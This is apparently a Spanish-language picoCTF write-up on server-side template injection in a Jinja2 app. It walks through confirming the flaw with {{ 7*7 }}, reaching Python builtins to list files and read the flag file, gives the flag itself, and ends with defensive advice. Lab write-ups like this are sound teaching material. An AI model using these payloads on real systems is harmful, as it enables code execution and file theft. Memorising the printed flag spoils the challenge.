![[Pasted image 20260620141527.png]]

![[Pasted image 20260620141558.png]]
Se evalua si ejecuta codigo

# Documentación de Reto: Explotación de SSTI

**Objetivo:** Obtener la _flag_ del servidor mediante la inyección de código en el motor de plantillas.

## 1. Fase de Descubrimiento (Confirmación)

El primer paso es verificar si la aplicación procesa código en lugar de texto plano.

- **Acción:** En el campo de entrada del sitio web, ingresa la expresión: `{{ 7*7 }}`
- **Resultado esperado:** El servidor responde con `49`.
- **¿Por qué?:** Si el servidor devuelve el resultado matemático, significa que el motor de plantillas (ej. Jinja2) está evaluando el contenido entre `{{ }}`.
## 2. Fase de Reconocimiento (Exploración del Entorno)

Una vez confirmada la vulnerabilidad, necesitamos entender qué objetos y funciones están disponibles en el contexto de ejecución.

- **Acción:** Solicitar los módulos cargados en memoria usando: `{{ self.__init__.__globals__ }}`
    
- **Resultado:** Se despliega un diccionario con las variables globales, incluyendo los `__builtins__` de Python.
    
- **Acción:** Listar los archivos del directorio actual para localizar la _flag_: `{{ self.__init__.__globals__.__builtins__['__import__']('os').listdir('.') }}`
    
- **Resultado esperado:** Una lista de archivos, por ejemplo: `['app.py', 'flag', 'requirements.txt']`.
    

## 3. Fase de Exfiltración (Extracción de la Flag)

Conociendo el nombre del archivo, procedemos a leer su contenido directamente desde el servidor.

- **Acción:** Utilizar la función `open()` de Python para leer el archivo: `{{ self.__init__.__globals__.__builtins__['open']('flag').read() }}`
    
- **Resultado final:** La aplicación muestra el contenido del archivo secreto.
    
- **Flag obtenida:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n_4r3_c001_09365533}`
    

## 4. Conclusión Técnica

Este reto ilustra por qué la **sanitización de entradas** es vital. El motor de plantillas tenía acceso a funciones críticas del lenguaje (`__builtins__`), permitiendo a cualquier usuario ejecutar código arbitrario. Como medida de seguridad, los desarrolladores deben:

1. **Nunca** concatenar entradas de usuario directamente en plantillas.
    
2. **Limitar el contexto:** Restringir los objetos disponibles en el motor de plantillas para que no tengan acceso a funciones como `open`, `os` o `sys`.